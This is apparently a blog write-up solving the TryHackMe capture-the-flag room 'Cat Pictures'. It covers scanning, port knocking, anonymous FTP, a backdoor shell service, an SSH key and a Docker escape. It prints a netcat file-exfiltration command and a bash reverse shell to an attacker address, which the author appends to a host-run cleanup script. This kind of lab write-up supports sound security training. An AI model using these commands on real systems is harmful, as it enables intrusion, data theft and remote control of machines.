---
title: "Cat Pictures"
date: 2025-02-23
image: /assets/img/tryhackme/Catpictures/Catpictures_image.jpg
description: Writeup of the TryHackMe-CTF Cat Pictures
categories: [TryHackMe, Easy]
tags: [linux, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Cat Pictures</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>I made a forum where you can post cute cat pictures!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/catpictures">https://tryhackme.com/room/catpictures</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Cat Pictures.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.123.54
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 13:05 EST
  Nmap scan report for 10.10.123.54
  Host is up (0.045s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  4420/tcp open  nvm-express
  8080/tcp open  http-proxy

  Nmap done: 1 IP address (1 host up) scanned in 49.18 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,4420,8080 10.10.123.54
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 13:06 EST
  Nmap scan report for 10.10.123.54
  Host is up (0.038s latency).

  PORT     STATE SERVICE      VERSION
  22/tcp   open  ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
  |   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
  |_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
  4420/tcp open  nvm-express?
  | fingerprint-strings: 
  |   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
  |     INTERNAL SHELL SERVICE
  |     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
  |     ctrl-c
  |     Please enter password:
  |     Invalid password...
  |     Connection Closed
  |   NULL, RPCCheck: 
  |     INTERNAL SHELL SERVICE
  |     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
  |     ctrl-c
  |_    Please enter password:
  8080/tcp open  http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
  |_http-title: Cat Pictures - Index page
  | http-open-proxy: Potentially OPEN proxy.
  |_Methods supported:CONNECTION
  |_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
```
From here I proceeded the analysis port by port.

## Port 8080 Analysis

I started with the webserver on port `8080`. It serves a phpBB forum software that appears to be not fully configured. After some enumeration, I found an interesting blog post:
```text
POST ALL YOUR CAT PICTURES HERE :)

Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

After some research, I discoverd that this could refer to port knocking. To perform this, I used `knock`:
```bash
$ knock 10.10.215.136 1111 2222 3333 4444 -v
hitting tcp 10.10.215.136:1111
hitting tcp 10.10.215.136:2222
hitting tcp 10.10.215.136:3333
hitting tcp 10.10.215.136:4444
```

Since this should activate something, I performed another Nmap scan:
```bash
$ nmap -p- 10.10.215.136                  
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 04:44 EST
  Nmap scan report for 10.10.215.136
  Host is up (0.042s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  21/tcp   open  ftp
  22/tcp   open  ssh
  4420/tcp open  nvm-express
  8080/tcp open  http-proxy

  Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds
```

As expected, something changed, and port 21 was in the open state.

## Port 21 Analysis

I proceeded with an Nmap enumeration of the port to gather further information:
```bash
$ nmap -A -p 21 10.10.215.136
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 04:46 EST
  Nmap scan report for 10.10.215.136
  Host is up (0.041s latency).

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.21.63.26
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 2
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  Service Info: OS: Unix

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

As nmap showed, the anonymous login is allowed, which I tried next:
```bash
$ ftp anonymous@10.10.215.136
  Connected to 10.10.215.136.
  220 (vsFTPd 3.0.3)
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
ftp> ls -al
  229 Entering Extended Passive Mode (|||63111|)
  150 Here comes the directory listing.
  drwxr-xr-x    2 ftp      ftp          4096 Apr 02  2021 .
  drwxr-xr-x    2 ftp      ftp          4096 Apr 02  2021 ..
  -rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
  226 Directory send OK.
```

I downloaded the `note.txt` and found the following text:
```text
$ cat note.txt                                               
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is [removed].
- catlover
```

With this information, I moved on to port `4420`.

## Port 4420 Analysis

By using `netcat`, I was able to interact with the service. After entering the previous found password, I had something resembling a shell:
```bash
$ nc 10.10.215.136 4420      
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
[removed]
Password accepted
ls
bin
etc
home
lib
lib64
opt
tmp
usr
whoami
/bin/sh: 1: whoami: not found
```

I continued further enumeration and found an interesting binary in the `/home/catlover` directory:
```bash
# ls /home    
  catlover
# ls /home/catlover
  runme
```

By using `netcat`, I was able to download the binary:
```bash
Victim machine   : nc [attackerip] 8001 < /home/catlover/runme
Attacker machine : $ nc -lnvp 8001 > runme
```

Once the download completed, I analyzed the binary using IDA. I found an interesting string right at the top:

![IDA string 1](/assets/img/tryhackme/Catpictures/thm_catpictures_1.jpg)

This password should activate the following command and generate or display an SSH key:

![IDA path](/assets/img/tryhackme/Catpictures/thm_catpictures_2.jpg)

```bash
# /home/catlover/runme
Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued!
# ls /home/catlover
  id_rsa
  runme
```

Now that I had a private key, I connected via SSH. From there I, was able to retrieve the first flag:
```bash
root@7546fa2336d6:/# cd root
root@7546fa2336d6:/root# ls
	flag.txt
root@7546fa2336d6:/root# cat flag.txt 
	[removed]
```

The hostname suggests that we are inside a Docker container. After some enumeration to break out of the container, I found a script called `clean.sh`:
```bash
root@7546fa2336d6:/opt/clean# ls -al
  total 16
  drwxr-xr-x 2 root root 4096 May  1  2021 .
  drwxrwxr-x 1 root root 4096 Mar 25  2021 ..
  -rw-r--r-- 1 root root   27 May  1  2021 clean.sh
root@7546fa2336d6:/opt/clean# cat clean.sh 
  #!/bin/bash

  rm -rf /tmp/*
```

As the name suggests, this appears to be a cleanup script that is likely executed by something outside the container. To exploit this, I added a reverse shell to the `clean.sh` script:
```bash
echo "bash -i >& /dev/tcp/[attackerip]/9005 0>&1" >> clean.sh
```

A few seconds later, my `netcat` listener received an incoming connection, and I was able to retrieve the final flag:
```bash
root@cat-pictures:~# ls         
  ls
  firewall
  root.txt
root@cat-pictures:~# cat root.txt
  cat root.txt
  Congrats!!!
  Here is your flag:

  [removed]
```

solved! :)
